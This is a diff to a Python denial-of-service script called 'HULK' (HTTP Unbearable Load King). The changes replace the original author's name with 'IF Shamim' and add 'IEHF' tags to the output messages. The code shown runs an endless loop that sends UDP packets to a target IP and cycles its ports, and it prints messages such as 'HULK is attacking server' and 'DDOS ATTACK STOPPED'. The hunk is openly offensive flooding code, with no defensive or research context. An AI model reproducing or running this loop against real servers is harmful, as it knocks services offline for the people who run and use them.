@@ -33,7 +33,7 @@ print('''
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
     *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
+    *          Author: ifshamim                    *
     *                                              *
     ************************************************
     ************************************************
@@ -57,23 +57,23 @@ print('''
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
     *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
+    *          Author: IF Shamim                   *
     *                                              *
     ************************************************
 
 	''')
 try:
 	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
+	print(" ✅ Valid IP Checked..IEHF.. ")
+	print(" [+] Attack Screen Loading ..IEHF..")
 except ValidationError as exception :
 	print(" ✘ Input a right url")
 
 #Lets start our attack
 print(" ")
-print("    That's my secret Cap, I am always angry ")
+print("    That's my secret Cap, I am always angry IEHF")
 print(" " )
-print(" [+] HULK is attacking server " + ip )
+print(" [+] IEHF is attacking server " + ip )
 print (" " )
 time.sleep(5)
 sent = 0
@@ -81,14 +81,14 @@ try :
  while True:
 		sock.sendto(bytes, (ip, port))
 		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
+		print("\n [+] IEHF Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
 		if port == 65534:
 			port = 1
 except KeyboardInterrupt:
 	print(" ")
 	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
-input(" Enter To Exit")
+	print(" [-] IEHF DDOS ATTACK STOPPED")
+input(" Enter To Exit IEHF")
 os.system("clear")
 print(" [-] Dr. Banner is tired...")
 time.sleep(2)
